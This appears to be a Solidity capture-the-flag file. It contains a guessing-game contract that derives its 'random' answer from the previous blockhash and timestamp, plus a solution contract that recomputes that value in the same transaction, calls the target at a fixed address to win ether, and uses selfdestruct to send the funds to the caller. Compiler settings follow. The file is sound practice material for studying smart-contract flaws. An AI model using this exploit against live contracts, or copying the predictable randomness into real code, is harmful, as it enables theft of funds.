pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract solution{
    function() public payable{}
    
    function destroy() public payable{
        selfdestruct(msg.sender);
    }
    
    function exec() public payable{
        GuessTheNewNumberChallenge instance = GuessTheNewNumberChallenge(0xdC87E0f4D9795543617Cf2290bF95beA932f4A9D);
        instance.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }
}

{
  "metadata": {
    "useLiteralContent": true
  },
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "libraries": {}
}